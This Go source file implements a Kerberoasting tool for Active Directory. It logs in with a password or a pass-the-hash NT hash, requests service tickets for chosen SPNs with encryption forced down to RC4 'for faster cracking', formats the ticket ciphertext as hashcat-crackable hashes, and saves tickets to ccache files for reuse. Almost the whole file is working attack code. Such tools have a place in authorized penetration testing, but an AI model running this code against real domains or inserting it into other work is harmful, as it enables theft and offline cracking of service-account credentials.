package kerberos

import (
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/types"
)

// TGSResult holds the result of a TGS request for Kerberoasting
type TGSResult struct {
	Username    string
	SPN         string
	Hash        string
	EType       int32
	TicketBytes []byte               // Raw marshaled ticket (for ccache saving)
	SessionKey  types.EncryptionKey  // Session key (for ccache saving)
	Realm       string               // Realm (for ccache saving)
}

// TGSOptions configures TGS request authentication
type TGSOptions struct {
	Username   string
	Password   string
	NTHash     string // NTLM hash for pass-the-hash (just the NT part, 32 hex chars)
	Domain     string
	KDCHost    string
	TargetUser string
	SPN        string
}

// GetTGS requests a service ticket (TGS) for the given SPN and returns it in hashcat format.
// This is used for Kerberoasting attacks.
func GetTGS(username, password, domain, kdcHost, targetUser, spn string) (*TGSResult, error) {
	return GetTGSWithOptions(TGSOptions{
		Username:   username,
		Password:   password,
		Domain:     domain,
		KDCHost:    kdcHost,
		TargetUser: targetUser,
		SPN:        spn,
	})
}

// GetTGSWithHash requests a service ticket using pass-the-hash authentication.
func GetTGSWithHash(username, nthash, domain, kdcHost, targetUser, spn string) (*TGSResult, error) {
	return GetTGSWithOptions(TGSOptions{
		Username:   username,
		NTHash:     nthash,
		Domain:     domain,
		KDCHost:    kdcHost,
		TargetUser: targetUser,
		SPN:        spn,
	})
}

// GetTGSWithOptions requests a service ticket with configurable authentication options.
func GetTGSWithOptions(opts TGSOptions) (*TGSResult, error) {
	realm := strings.ToUpper(opts.Domain)

	// Create Kerberos config
	cfg := config.New()
	cfg.LibDefaults.DefaultRealm = realm
	// Request RC4 (etype 23) for faster cracking - matches Impacket behavior
	cfg.LibDefaults.DefaultTktEnctypes = []string{"rc4-hmac"}
	cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{etypeID.RC4_HMAC}
	cfg.LibDefaults.DefaultTGSEnctypes = []string{"rc4-hmac"}
	cfg.LibDefaults.DefaultTGSEnctypeIDs = []int32{etypeID.RC4_HMAC}
	cfg.LibDefaults.PermittedEnctypes = []string{"rc4-hmac", "aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"}
	cfg.LibDefaults.PermittedEnctypeIDs = []int32{etypeID.RC4_HMAC, etypeID.AES256_CTS_HMAC_SHA1_96, etypeID.AES128_CTS_HMAC_SHA1_96}

	// Add KDC configuration
	cfg.Realms = []config.Realm{
		{
			Realm:         realm,
			KDC:           []string{fmt.Sprintf("%s:88", opts.KDCHost)},
			DefaultDomain: strings.ToLower(opts.Domain),
		},
	}
	cfg.DomainRealm = config.DomainRealm{
		strings.ToLower(opts.Domain): realm,
	}

	var cl *client.Client

	// Create client based on auth method
	if opts.NTHash != "" {
		// Pass-the-hash: create keytab from NT hash
		kt, err := BuildKeytabFromNTHash(opts.Username, realm, opts.NTHash)
		if err != nil {
			return nil, fmt.Errorf("failed to create keytab from hash: %v", err)
		}
		cl = client.NewWithKeytab(opts.Username, realm, kt, cfg, client.DisablePAFXFAST(true))
	} else if opts.Password != "" {
		// Password authentication
		cl = client.NewWithPassword(opts.Username, realm, opts.Password, cfg, client.DisablePAFXFAST(true))
	} else {
		return nil, fmt.Errorf("either password or NT hash must be provided")
	}

	// Login to get TGT
	if err := cl.Login(); err != nil {
		return nil, fmt.Errorf("failed to get TGT: %v", err)
	}
	defer cl.Destroy()

	// Request service ticket for the SPN
	ticket, sessionKey, err := cl.GetServiceTicket(opts.SPN)
	if err != nil {
		return nil, fmt.Errorf("failed to get TGS for %s: %v", opts.SPN, err)
	}

	// Format the hash for hashcat
	hash := formatTGSHash(opts.TargetUser, realm, opts.SPN, ticket.EncPart.EType, ticket.EncPart.Cipher)

	// Marshal ticket for ccache saving
	ticketBytes, _ := ticket.Marshal()

	return &TGSResult{
		Username:    opts.TargetUser,
		SPN:         opts.SPN,
		Hash:        hash,
		EType:       ticket.EncPart.EType,
		TicketBytes: ticketBytes,
		SessionKey:  sessionKey,
		Realm:       realm,
	}, nil
}

// SaveTGS saves a Kerberoasting TGS result to a ccache file.
func SaveTGS(filename string, result *TGSResult) error {
	if len(result.TicketBytes) == 0 {
		return fmt.Errorf("no ticket data available to save")
	}

	// Build principal names for ccache
	cName := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, result.Username)
	sName := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, result.SPN)

	now := time.Now().UTC()
	return saveToCCache(filename, result.TicketBytes, result.SessionKey,
		cName, result.Realm, sName,
		now, now.Add(10*time.Hour), now.Add(7*24*time.Hour), 0x50800000)
}

// formatTGSHash formats a TGS ticket in hashcat format
func formatTGSHash(username, realm, spn string, etype int32, cipher []byte) string {
	// Replace : with ~ in SPN (hashcat format requirement)
	spnEscaped := strings.ReplaceAll(spn, ":", "~")
	cipherHex := hex.EncodeToString(cipher)

	switch etype {
	case etypeID.RC4_HMAC: // 23
		// RC4 format: $krb5tgs$23$*user$realm$spn*$checksum$data
		// Checksum is first 16 bytes (32 hex chars)
		if len(cipherHex) < 32 {
			return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s", etype, username, realm, spnEscaped, cipherHex)
		}
		return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
			etype, username, realm, spnEscaped,
			cipherHex[:32], cipherHex[32:])

	case etypeID.AES128_CTS_HMAC_SHA1_96: // 17
		// AES128 format: $krb5tgs$17$user$realm$*spn*$checksum$data
		// Checksum is last 12 bytes (24 hex chars)
		if len(cipherHex) < 24 {
			return fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s", etype, username, realm, spnEscaped, cipherHex)
		}
		checksumStart := len(cipherHex) - 24
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s$%s",
			etype, username, realm, spnEscaped,
			cipherHex[checksumStart:], cipherHex[:checksumStart])

	case etypeID.AES256_CTS_HMAC_SHA1_96: // 18
		// AES256 format: $krb5tgs$18$user$realm$*spn*$checksum$data
		// Checksum is last 12 bytes (24 hex chars)
		if len(cipherHex) < 24 {
			return fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s", etype, username, realm, spnEscaped, cipherHex)
		}
		checksumStart := len(cipherHex) - 24
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s$%s",
			etype, username, realm, spnEscaped,
			cipherHex[checksumStart:], cipherHex[:checksumStart])

	default:
		// Generic format for other etypes
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$%s$%s", etype, username, realm, spnEscaped, cipherHex)
	}
}
